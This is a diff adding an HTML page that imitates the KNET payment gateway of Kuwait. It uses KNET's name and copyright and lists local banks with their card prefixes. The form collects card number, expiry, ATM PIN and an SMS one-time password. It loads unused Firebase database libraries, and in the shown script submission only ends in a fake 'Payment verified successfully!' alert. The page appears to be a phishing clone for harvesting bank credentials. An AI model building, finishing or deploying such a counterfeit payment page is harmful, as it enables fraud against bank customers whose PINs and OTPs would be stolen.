@@ -1,0 +1,1120 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>KNET Payment</title>
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+
+    <!-- Utility Libraries -->
+    <script src="https://cdn.jsdelivr.net/npm/clsx@2.0.0/dist/clsx.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/tailwind-merge@1.14.0/dist/bundle.min.js"></script>
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+      body {
+        font-family: Verdana, Arial, Helvetica, sans-serif;
+        background-color: #ebebeb;
+      }
+      .container {
+        width: 100%;
+        padding: 5px;
+        box-sizing: border-box;
+      }
+      .content-block {
+        width: 395px;
+        margin: 0 auto;
+      }
+      .row {
+        border-bottom: 1px solid #8f8f90;
+        padding-bottom: 5px;
+        padding-top: 5px;
+      }
+      .row_new {
+        padding-bottom: 5px;
+        padding-top: 5px;
+      }
+      .column-label,
+      .column-value,
+      .column-long {
+        float: left;
+      }
+      .column-label {
+        width: 40%;
+      }
+      .column-value {
+        width: 60%;
+      }
+      .row.three-column .column-value {
+        width: 18%;
+        margin-right: 5px;
+      }
+      .row.three-column .column-long {
+        width: 39%;
+        float: right;
+      }
+      .row:after {
+        content: '';
+        display: table;
+        clear: both;
+      }
+      .form-card {
+        background-color: #ffffff;
+        padding: 20px;
+        border: 2px solid #8f8f90;
+        border-radius: 15px;
+        margin-bottom: 15px;
+        box-shadow: 0 0 6px rgba(0, 0, 0, 0.3);
+      }
+      .form-card:nth-child(1) {
+        margin-top: 25px;
+      }
+      .form-card .row:nth-child(1) {
+        padding-top: 0;
+      }
+      .footer-content .row,
+      .footer-content-new .row,
+      .form-card .row:nth-last-child(1) {
+        border: 0;
+        padding-bottom: 0;
+      }
+      form label {
+        font-size: 11px;
+        color: #0070cd;
+        font-weight: bold;
+        text-shadow: 0 1px 2px rgba(0, 0, 0, 0.2);
+      }
+      select {
+        font-size: 11px;
+        height: 20px;
+      }
+      form .text-label,
+      input,
+      select {
+        color: #444444;
+        font-weight: normal;
+      }
+      form input[type='tel'],
+      input[type='password'] {
+        border: 2px solid #0070cd;
+        box-shadow: inset 0 0 5px rgba(0, 0, 0, 0.3);
+        padding: 0 3px;
+        outline: 0;
+        font-size: 11px;
+        height: 20px;
+      }
+      form input[type='text'],
+      input[type='password'] {
+        border: 2px solid #0070cd;
+        box-shadow: inset 0 0 5px rgba(0, 0, 0, 0.3);
+        padding: 0 3px;
+        outline: 0;
+        font-size: 11px;
+        height: 20px;
+      }
+      .footer-content {
+        text-align: center;
+        margin-top: 15px;
+        font-weight: bold;
+        color: #2277d3;
+      }
+      .brand-img {
+        margin-right: 5px;
+        float: right;
+      }
+      .brand-info {
+        font-size: 12px;
+        text-align: left;
+      }
+
+      #ValidationMessage {
+        -moz-transaction: height 1s ease;
+        -webkit-transaction: height 1s ease;
+        transition: height 1s ease;
+        border: #ff0000 1px solid;
+        background-color: #f7dadd;
+        font-size: 12px;
+        font-family: helvetica, arial, sans serif;
+        color: #ff0000;
+        padding: 2px;
+        display: none;
+        margin-bottom: 3px;
+        text-align: center;
+      }
+      .footer-content #knet-brand {
+        width: 43px;
+        height: 43px;
+        margin-top: 5px;
+      }
+      .footer-content .social-links {
+        margin-top: 15px;
+        text-align: center;
+      }
+      .footer-content .social-links div {
+        height: 30px;
+        display: inline-block;
+      }
+      .footer-content .social-links div#knet-yt {
+        width: 35px;
+      }
+      .footer-content .social-links div#knet-sn {
+        width: 27px;
+      }
+      .footer-content .social-links div#knet-tw {
+        width: 27px;
+      }
+      .footer-content .social-links div#knet-it {
+        width: 27px;
+      }
+      .footer-content .social-links div#knet-fb {
+        width: 27px;
+      }
+      button {
+        width: 100%;
+      }
+
+      .submit-button {
+        background-color: #eaeaea;
+        border: 1px solid #cacaca;
+        padding: 5px 0;
+        font-weight: bold;
+        color: #666666;
+        width: 50%;
+        float: left;
+        height: 27px;
+        border-radius: 4px;
+      }
+      .cancel-button {
+        background-color: #eaeaea;
+        border: 1px solid #cacaca;
+        padding: 5px 0;
+        font-weight: bold;
+        color: #666666;
+        width: 50%;
+        height: 27px;
+        border-radius: 4px;
+        -webkit-appearance: none;
+      }
+      .row.alert-msg {
+        font-size: 12px;
+        text-align: justify;
+        background-color: #d9edf6;
+        padding: 10px !important;
+        border: 1px solid #bacce0;
+        border-radius: 4px;
+        margin-bottom: 10px;
+      }
+      @media all and (max-width: 425px) {
+        .content-block {
+          width: 98%;
+          margin: 0 auto;
+        }
+      }
+      .overlay {
+        background: #555555;
+        display: none;
+        position: absolute;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        opacity: 0.5;
+      }
+      .terms {
+        font-size: 11px;
+        color: #0070cd;
+        font-weight: bold;
+        font-style: italic;
+        text-decoration: none;
+      }
+      .paymentOption {
+        vertical-align: super;
+      }
+
+      .container-blogo {
+        width: 100%;
+        margin-top: -5px;
+        margin-bottom: 15px;
+      }
+      .logoHead-mob {
+        width: 42%;
+        margin-left: 27%;
+        /* width:16%;
+  margin-left:40%; */
+        margin-right: auto;
+      }
+
+      /* Added for Knet */
+      /* Medium devices (tablets, 768px and up) */
+      @media (max-width: 768px) {
+        .wrapper {
+          margin-top: 10%;
+        }
+      }
+      /* Medium devices (tablets, 768px and up) */
+      @media (max-width: 500px) {
+        .wrapper {
+          max-width: 100%;
+          width: 100%;
+        }
+      }
+      /* Medium devices (tablets, 768px and up) */
+      @media (max-width: 435px) {
+        .logoHead {
+          left: 36%;
+        }
+        .contentBox {
+          padding: 18px;
+        }
+      }
+      /* Medium devices (tablets, 768px and up) */
+      @media (max-width: 380px) {
+        .contentBox {
+          padding: 12px;
+        }
+        .wrapper {
+          margin-top: 20%;
+        }
+      }
+      @media (max-width: 350px) {
+        .contentBox .col:first-child .paymentlabel {
+          padding-left: 0;
+        }
+      }
+      /*added for tooltip by sib*/
+
+      .tooltip {
+        position: relative;
+        display: block;
+      }
+      .tooltip .tooltiptext {
+        visibility: hidden;
+        width: 80%;
+        background-color: #555;
+        color: #fff;
+        text-align: center;
+        border-radius: 6px;
+        padding: 10px;
+        position: absolute;
+        z-index: 1;
+        bottom: 113%;
+        left: 50%;
+        margin-left: -52%;
+        opacity: 0;
+        transition: opacity 0.5s;
+        font-size: 12px;
+        margin-bottom: 9px;
+        -webkit-box-shadow: 4px 3px 10px 0px rgba(0, 0, 0, 0.75);
+        -moz-box-shadow: 4px 3px 10px 0px rgba(0, 0, 0, 0.75);
+        box-shadow: 4px 3px 10px 0px rgba(0, 0, 0, 0.75);
+      }
+      .tooltip .tooltiptext::after {
+        content: '';
+        position: absolute;
+        top: 100%;
+        left: 50%;
+        margin-left: -45px;
+        border-width: 5px;
+        border-style: solid;
+        border-color: #555 transparent transparent transparent;
+      }
+      /*.tooltip:hover .tooltiptext {*/
+      div#tooltip_0:hover .tooltiptext {
+        visibility: visible;
+        opacity: 1;
+      }
+      /* turn the img to gray :sib*/
+      .doGray {
+        -webkit-filter: grayscale(100%);
+        filter: grayscale(100%);
+        opacity: 0.5;
+      }
+      /* Added by Ahmed & Saqib */
+      label#ValidationMessage {
+        -moz-transaction: height 1s ease;
+        -webkit-transaction: height 1s ease;
+        transition: height 1s ease;
+        border: #ff0000 1px solid;
+        background-color: #f7dadd;
+        font-size: 12px;
+        font-family: helvetica, arial, sans serif;
+        color: #ff0000;
+        padding: 5px 2px 5px 2px;
+        display: none;
+        margin-bottom: 3px;
+        text-align: center;
+        margin-top: 10px;
+      }
+      div#fasterCheckDiv1 {
+        float: left;
+        padding-left: 10%;
+        position: relative;
+        display: block;
+        width: 35%;
+        padding-top: 3px;
+      }
+      div#fasterCheckDiv2 {
+        float: left;
+        margin-left: 30%;
+        position: relative;
+        padding-top: 3px;
+        width: 70px;
+        padding-top: 3px;
+      }
+      div#fasterCheckDiv1 > label > img {
+        width: 48px;
+        height: 35px;
+        border-radius: 3px;
+      }
+      div#fasterCheckDiv2 > label > img {
+        width: 48px;
+        height: 35px;
+        border-radius: 3px;
+      }
+      .madd {
+        height: 90px;
+        max-width: 372px;
+        margin: 5px auto -30px auto;
+        border-radius: 0px 10px;
+        display: block;
+      }
+      .pic {
+        display: flex;
+        justify-content: center;
+      }
+      .logo {
+        width: 100vw !important;
+        margin: 0;
+        padding: 0;
+      }
+      /* Ends */
+    </style>
+  </head>
+  <body>
+    <div>
+      <form onsubmit="return false;">
+        <div class="madd"></div>
+
+        <div id="PayPageEntry">
+          <div class="pic">
+            <img src="./dre5.png" class="logo" alt="logo" />
+          </div>
+          <div class="container">
+            <div class="content-block">
+              <div class="form-card">
+                <div class="container pic">
+                  <img
+                    src="./kv.png"
+                    class="-"
+                    alt="logo"
+                    height="50"
+                    width="50"
+                  />
+                </div>
+                <div class="row">
+                  <label class="column-label">Merchant: </label>
+                  <label class="column-value text-label">KNET Payment</label>
+                </div>
+                <div id="OrgTranxAmt">
+                  <label class="column-label"> Amount: </label>
+                  <label class="column-value text-label" id="amount">
+                    0.000 KD&nbsp;
+                  </label>
+                </div>
+              </div>
+              <div class="form-card">
+                <div
+                  class="notification"
+                  style="display: none"
+                  id="otpmsgDC"
+                ></div>
+                <div
+                  class="notification"
+                  style="display: none"
+                  id="CVmsg"
+                ></div>
+                <div id="ValidationMessage"></div>
+                <div id="savedCardDiv" style="display: none">
+                  <div class="row">
+                    <br />
+                  </div>
+                </div>
+
+                <!-- Step 1: Card Details -->
+                <div id="cardDetailsSection">
+                  <div id="FCUseDebitEnable" style="margin-top: 5px">
+                    <div class="row">
+                      <label class="column-label" style="width: 40%">
+                        Select Your Bank:
+                      </label>
+                      <select
+                        class="column-value"
+                        style="width: 60%"
+                        id="bankSelect"
+                      >
+                        <option value="bankname" title="Select Your Bank">
+                          Select Your Banks
+                        </option>
+                        <!-- Bank options will be populated by JavaScript -->
+                      </select>
+                    </div>
+                    <div class="row three-column" id="Paymentpagecardnumber">
+                      <label class="column-label">Card Number:</label>
+                      <label>
+                        <select
+                          class="column-value"
+                          name="dcprefix"
+                          id="dcprefix"
+                          style="width: 26%"
+                        >
+                          <option value="i">prefix</option>
+                          <!-- Prefix options will be populated by JavaScript based on selected bank -->
+                        </select>
+                      </label>
+                      <label>
+                        <input
+                          name="debitNumber"
+                          id="debitNumber"
+                          type="tel"
+                          inputmode="numeric"
+                          pattern="[0-9]*"
+                          size="10"
+                          class="allownumericwithoutdecimal"
+                          style="width: 32%"
+                          maxlength="10"
+                          title="Should be in number. Length should be 10"
+                        />
+                      </label>
+                    </div>
+                    <div class="row three-column" id="cardExpdate">
+                      <div id="debitExpDate">
+                        <label class="column-label">Expiration Date:</label>
+                      </div>
+                      <select id="monthSelect" class="column-value">
+                        <option value="0">MM</option>
+                        <option value="1">01</option>
+                        <option value="2">02</option>
+                        <option value="3">03</option>
+                        <option value="4">04</option>
+                        <option value="5">05</option>
+                        <option value="6">06</option>
+                        <option value="7">07</option>
+                        <option value="8">08</option>
+                        <option value="9">09</option>
+                        <option value="10">10</option>
+                        <option value="11">11</option>
+                        <option value="12">12</option>
+                      </select>
+                      <select id="yearSelect" class="column-long">
+                        <option value="0">YYYY</option>
+                        <option value="2024">2024</option>
+                        <option value="2025">2025</option>
+                        <option value="2026">2026</option>
+                        <option value="2027">2027</option>
+                        <option value="2028">2028</option>
+                        <option value="2029">2029</option>
+                        <option value="2030">2030</option>
+                        <option value="2031">2031</option>
+                        <option value="2032">2032</option>
+                        <option value="2033">2033</option>
+                        <option value="2034">2034</option>
+                        <option value="2035">2035</option>
+                        <!-- Additional years omitted for brevity -->
+                      </select>
+                    </div>
+                    <div class="row" id="PinRow">
+                      <input type="hidden" name="cardPinType" value="A" />
+                      <div id="eComPin">
+                        <label class="column-label">PIN:</label>
+                      </div>
+                      <div>
+                        <input
+                          inputmode="numeric"
+                          pattern="[0-9]*"
+                          name="cardPin"
+                          id="cardPin"
+                          autocomplete="off"
+                          title="Should be in number. Length should be 4"
+                          type="password"
+                          size="4"
+                          maxlength="4"
+                          class="allownumericwithoutdecimal"
+                          style="width: 60%"
+                        />
+                      </div>
+                    </div>
+                    <div class="row" id="CvvRow" style="display: none">
+                      <input type="hidden" name="cardPinType" value="A" />
+                      <div id="eComCvv">
+                        <label class="column-label">CVV:</label>
+                      </div>
+                      <div>
+                        <input
+                          inputmode="numeric"
+                          pattern="[0-9]*"
+                          name="cvv"
+                          id="cvv"
+                          autocomplete="off"
+                          title="Should be in number. Length should be 3"
+                          type="password"
+                          size="3"
+                          maxlength="3"
+                          class="allownumericwithoutdecimal"
+                          style="width: 60%"
+                        />
+                      </div>
+                    </div>
+                  </div>
+                </div>
+
+                <!-- Step 2: OTP Verification (hidden by default) -->
+                <div id="otpVerificationSection" style="display: none">
+                  <div
+                    class="notification"
+                    style="
+                      border: #ff0000 1px solid;
+                      background-color: #f7dadd;
+                      font-size: 12px;
+                      font-family: helvetica, arial, sans serif;
+                      color: #ff0000;
+                      padding-right: 15px;
+                      margin-bottom: 3px;
+                      text-align: center;
+                      display: none;
+                    "
+                    id="otpmsgDC2"
+                  ></div>
+                  <div
+                    class="row alert-msg"
+                    id="notificationbox"
+                    style="
+                      color: #31708f;
+                      font-family: Arial, Helvetica, serif;
+                      font-size: 13px;
+                    "
+                  >
+                    <div id="notification">
+                      <p>
+                        <span class="title" style="font-weight: bold"
+                          >NOTIFICATION:</span
+                        >
+                        You will presently receive an SMS on your mobile number
+                        registered with your bank. This is an OTP (One Time
+                        Password) SMS, it contains 6 digits to be entered in the
+                        box below.
+                      </p>
+                    </div>
+                  </div>
+                  <div class="row">
+                    <div id="payConfirmCardNum">
+                      <label class="column-label">Card Number:</label>
+                    </div>
+                    <div>
+                      <label
+                        class="column-value text-label"
+                        id="DCNumber"
+                        style="padding-left: 5px"
+                      ></label>
+                    </div>
+                  </div>
+                  <div class="row" id="payConfirmExpmnth">
+                    <div>
+                      <label class="column-label" style="width: 41%"
+                        >Expiration Month:</label
+                      >
+                    </div>
+                    <div>
+                      <label
+                        class="column-value text-label"
+                        id="expmnth"
+                        style="padding-left: 5px; width: 59%"
+                      ></label>
+                    </div>
+                  </div>
+                  <div class="row" id="payConfirmExpyr">
+                    <div>
+                      <label class="column-label">Expiration Year:</label>
+                    </div>
+                    <div>
+                      <label
+                        class="column-value text-label"
+                        id="expyear"
+                        style="padding-left: 5px"
+                      ></label>
+                    </div>
+                  </div>
+                  <div class="row">
+                    <div>
+                      <label class="column-label">PIN:</label>
+                    </div>
+                    <div>
+                      <label
+                        class="column-value text-label"
+                        style="padding-left: 5px"
+                        >****</label
+                      >
+                    </div>
+                  </div>
+                  <div class="row" id="OTPDCDIV">
+                    <div>
+                      <label class="column-label" style="padding-top: 4px"
+                        >OTP:</label
+                      >
+                    </div>
+                    <div>
+                      <input
+                        type="text"
+                        inputmode="numeric"
+                        pattern="[0-9]*"
+                        autocomplete="off"
+                        class="allownumericwithoutdecimal"
+                        style="width: 60%"
+                        id="debitOTPtimer"
+                        name="debitOTP"
+                        size="6"
+                        maxlength="6"
+                      />
+                      <div>
+                        <label
+                          class="column-value text-label"
+                          style="
+                            display: none;
+                            float: right;
+                            cursor: pointer;
+                            color: #0077d5;
+                            text-decoration: underline;
+                          "
+                          id="Resend"
+                          >Resend OTP</label
+                        >
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <div class="form-card">
+                <div class="row">
+                  <div style="text-align: center; width: 100%">
+                    <div id="loading" style="display: none">
+                      <center>
+                        <label
+                          class="column-value text-label"
+                          style="width: 70%; text-align: center"
+                        >
+                          Processing.. please wait ...
+                        </label>
+                      </center>
+                    </div>
+                    <div
+                      style="display: flex; justify-content: center"
+                      id="submithide1"
+                    >
+                      <button id="submitButton" disabled class="submit-button">
+                        Submit
+                      </button>
+                      <button id="cancelButton" class="cancel-button">
+                        Cancel
+                      </button>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <div id="overlayhide" class="overlay" style="display: none"></div>
+
+              <footer>
+                <div class="footer-content-new">
+                  <div class="row_new">
+                    <div
+                      style="
+                        text-align: center;
+                        font-size: 11px;
+                        line-height: 1;
+                      "
+                    >
+                      All&nbsp;Rights&nbsp;Reserved.&nbsp;Copyright&nbsp;2024&nbsp;©&nbsp;
+                      <br />
+                      <span
+                        style="
+                          font-size: 10px;
+                          font-weight: bold;
+                          color: #0077d5;
+                        "
+                      >
+                        The&nbsp;Shared&nbsp;Electronic&nbsp;Banking&nbsp;Services&nbsp;Company
+                        - KNET
+                      </span>
+                    </div>
+                  </div>
+                  <div id="DigiCertClickID_cM-vbZrL"></div>
+                </div>
+                <div id="DigiCertClickID_cM-vbZrL"></div>
+              </footer>
+            </div>
+          </div>
+        </div>
+      </form>
+    </div>
+
+    <script>
+      // Define the BANKS array that was missing from the original code
+      const BANKS = [
+        {
+          value: 'ABK',
+          label: 'Al Ahli Bank of Kuwait',
+          cardPrefixes: ['403622', '428628', '423826'],
+        },
+        {
+          value: 'ALRAJHI',
+          label: 'Al Rajhi Bank',
+          cardPrefixes: ['458838'],
+        },
+        {
+          value: 'BBK',
+          label: 'Bank of Bahrain and Kuwait',
+          cardPrefixes: ['418056', '588790'],
+        },
+        {
+          value: 'BOUBYAN',
+          label: 'Boubyan Bank',
+          cardPrefixes: [
+            '470350',
+            '490455',
+            '490456',
+            '404919',
+            '450605',
+            '426058',
+            '431199',
+          ],
+        },
+        {
+          value: 'BURGAN',
+          label: 'Burgan Bank',
+          cardPrefixes: [
+            '468564',
+            '402978',
+            '403583',
+            '415254',
+            '450238',
+            '540759',
+            '49219000',
+          ],
+        },
+        {
+          value: 'CBK',
+          label: 'Commercial Bank of Kuwait',
+          cardPrefixes: ['532672', '537015', '521175', '516334'],
+        },
+        {
+          value: 'Doha',
+          label: 'Doha Bank',
+          cardPrefixes: ['419252'],
+        },
+        {
+          value: 'GBK',
+          label: 'Gulf Bank',
+          cardPrefixes: [
+            '526206',
+            '531470',
+            '531644',
+            '531329',
+            '517419',
+            '517458',
+            '531471',
+            '559475',
+          ],
+        },
+        {
+          value: 'TAM',
+          label: 'TAM Bank',
+          cardPrefixes: ['45077848', '45077849'],
+        },
+        {
+          value: 'KFH',
+          label: 'Kuwait Finance House',
+          cardPrefixes: ['485602', '537016', '5326674', '450778'],
+        },
+        {
+          value: 'KIB',
+          label: 'Kuwait International Bank',
+          cardPrefixes: ['409054', '406464'],
+        },
+        {
+          value: 'NBK',
+          label: 'National Bank of Kuwait',
+          cardPrefixes: ['464452', '589160'],
+        },
+        {
+          value: 'Weyay',
+          label: 'Weyay Bank',
+          cardPrefixes: ['46445250', '543363'],
+        },
+        {
+          value: 'QNB',
+          label: 'Qatar National Bank',
+          cardPrefixes: ['521020', '524745'],
+        },
+        {
+          value: 'UNB',
+          label: 'Union National Bank',
+          cardPrefixes: ['457778'],
+        },
+        {
+          value: 'WARBA',
+          label: 'Warba Bank',
+          cardPrefixes: ['541350', '525528', '532749', '559459'],
+        },
+      ];
+
+      // Store payment information
+      const paymentInfo = {
+        step: 1, // 1 = card details, 2 = OTP verification
+        bankName: '',
+        cardPrefix: '',
+        cardNumber: '',
+        month: '',
+        year: '',
+        pin: '',
+      };
+
+      document.addEventListener('DOMContentLoaded', function () {
+        // Get DOM elements
+        const amountElement = document.getElementById('amount');
+        const bankSelect = document.getElementById('bankSelect');
+        const prefixSelect = document.getElementById('dcprefix');
+        const debitNumber = document.getElementById('debitNumber');
+        const monthSelect = document.getElementById('monthSelect');
+        const yearSelect = document.getElementById('yearSelect');
+        const cardPin = document.getElementById('cardPin');
+        const submitButton = document.getElementById('submitButton');
+        const cancelButton = document.getElementById('cancelButton');
+        const cardDetailsSection =
+          document.getElementById('cardDetailsSection');
+        const otpVerificationSection = document.getElementById(
+          'otpVerificationSection'
+        );
+        const DCNumber = document.getElementById('DCNumber');
+        const expmnth = document.getElementById('expmnth');
+        const expyear = document.getElementById('expyear');
+        const debitOTPtimer = document.getElementById('debitOTPtimer');
+        const resendButton = document.getElementById('Resend');
+        const loadingIndicator = document.getElementById('loading');
+
+        // Show amount from localStorage if available
+        const storedAmount = localStorage.getItem('amount');
+        if (storedAmount) {
+          amountElement.textContent = storedAmount + ' KD ';
+        }
+
+        // Populate bank options
+        BANKS.forEach((bank) => {
+          const option = document.createElement('option');
+          option.value = bank.value;
+          option.textContent = `${bank.label} [${bank.value}]`;
+          bankSelect.appendChild(option);
+        });
+
+        // Handle bank selection change
+        bankSelect.addEventListener('change', function () {
+          const selectedBankValue = this.value;
+          const selectedBank = BANKS.find(
+            (bank) => bank.value === selectedBankValue
+          );
+
+          paymentInfo.bankName = selectedBankValue;
+
+          // Update prefix dropdown
+          prefixSelect.innerHTML = '<option value="i">prefix</option>';
+
+          if (selectedBank) {
+            selectedBank.cardPrefixes.forEach((prefix) => {
+              const option = document.createElement('option');
+              option.value = prefix;
+              option.textContent = prefix;
+              prefixSelect.appendChild(option);
+            });
+          }
+
+          checkCardFormValidity();
+        });
+
+        // Handle prefix selection
+        prefixSelect.addEventListener('change', function () {
+          paymentInfo.cardPrefix = this.value;
+          checkCardFormValidity();
+        });
+
+        // Handle card number input
+        debitNumber.addEventListener('input', function () {
+          paymentInfo.cardNumber = this.value;
+          checkCardFormValidity();
+        });
+
+        // Handle month selection
+        monthSelect.addEventListener('change', function () {
+          paymentInfo.month = this.value;
+          checkCardFormValidity();
+        });
+
+        // Handle year selection
+        yearSelect.addEventListener('change', function () {
+          paymentInfo.year = this.value;
+          checkCardFormValidity();
+        });
+
+        // Handle PIN input
+        cardPin.addEventListener('input', function () {
+          paymentInfo.pin = this.value;
+          checkCardFormValidity();
+        });
+
+        // Handle OTP input
+        debitOTPtimer.addEventListener('input', function () {
+          checkOtpFormValidity();
+        });
+
+        // Check if card form is valid
+        function checkCardFormValidity() {
+          const isValid =
+            bankSelect.value !== 'bankname' &&
+            prefixSelect.value !== 'i' &&
+            debitNumber.value.length === 10 &&
+            monthSelect.value !== '0' &&
+            yearSelect.value !== '0' &&
+            cardPin.value.length === 4;
+
+          submitButton.disabled = !isValid;
+        }
+
+        // Check if OTP form is valid
+        function checkOtpFormValidity() {
+          submitButton.disabled = debitOTPtimer.value.length !== 6;
+        }
+
+        // Handle form submission
+        submitButton.addEventListener('click', function () {
+          if (this.disabled) return;
+
+          loadingIndicator.style.display = 'block';
+
+          if (paymentInfo.step === 1) {
+            // First step submission - show OTP verification
+            setTimeout(function () {
+              loadingIndicator.style.display = 'none';
+
+              // Update payment info step
+              paymentInfo.step = 2;
+
+              // Update masked card details
+              const selectedPrefix = prefixSelect.value;
+              const maskedCardNumber =
+                selectedPrefix +
+                '******' +
+                paymentInfo.cardNumber.substring(
+                  paymentInfo.cardNumber.length - 4
+                );
+              DCNumber.textContent = maskedCardNumber;
+              expmnth.textContent =
+                monthSelect.options[monthSelect.selectedIndex].text;
+              expyear.textContent =
+                yearSelect.options[yearSelect.selectedIndex].text;
+
+              // Hide card details, show OTP verification
+              cardDetailsSection.style.display = 'none';
+              otpVerificationSection.style.display = 'block';
+
+              // Update button text
+              submitButton.textContent = 'Confirm';
+              submitButton.disabled = true;
+
+              // Focus on OTP input
+              debitOTPtimer.focus();
+
+              // Show resend button after 30 seconds
+              setTimeout(function () {
+                resendButton.style.display = 'block';
+              }, 30000);
+            }, 1500);
+          } else {
+            // OTP verification submission
+            setTimeout(function () {
+              loadingIndicator.style.display = 'none';
+
+              // Here you would normally verify the OTP with the server
+              // For demo purposes, we'll just show a success message
+              alert('Payment verified successfully!');
+
+              // Reset form for new payment
+              resetForm();
+            }, 1500);
+          }
+        });
+
+        // Handle resend OTP button
+        resendButton.addEventListener('click', function () {
+          loadingIndicator.style.display = 'block';
+
+          setTimeout(function () {
+            loadingIndicator.style.display = 'none';
+            alert('A new OTP has been sent to your registered mobile number.');
+            debitOTPtimer.value = '';
+            debitOTPtimer.focus();
+            submitButton.disabled = true;
+          }, 1500);
+        });
+
+        // Handle cancel button
+        cancelButton.addEventListener('click', function () {
+          if (paymentInfo.step === 2) {
+            // If on OTP verification step, go back to card details
+            cardDetailsSection.style.display = 'block';
+            otpVerificationSection.style.display = 'none';
+            paymentInfo.step = 1;
+            submitButton.textContent = 'Submit';
+            checkCardFormValidity();
+          } else {
+            // Otherwise, reset the form
+            resetForm();
+          }
+        });
+
+        // Reset form to initial state
+        function resetForm() {
+          // Reset payment info
+          paymentInfo.step = 1;
+          paymentInfo.bankName = '';
+          paymentInfo.cardPrefix = '';
+          paymentInfo.cardNumber = '';
+          paymentInfo.month = '';
+          paymentInfo.year = '';
+          paymentInfo.pin = '';
+
+          // Reset form fields
+          bankSelect.value = 'bankname';
+          prefixSelect.innerHTML = '<option value="i">prefix</option>';
+          debitNumber.value = '';
+          monthSelect.value = '0';
+          yearSelect.value = '0';
+          cardPin.value = '';
+          debitOTPtimer.value = '';
+
+          // Show card details, hide OTP verification
+          cardDetailsSection.style.display = 'block';
+          otpVerificationSection.style.display = 'none';
+
+          // Reset button
+          submitButton.textContent = 'Submit';
+          submitButton.disabled = true;
+
+          // Hide resend button
+          resendButton.style.display = 'none';
+        }
+      });
+    </script>
+  </body>
+</html>
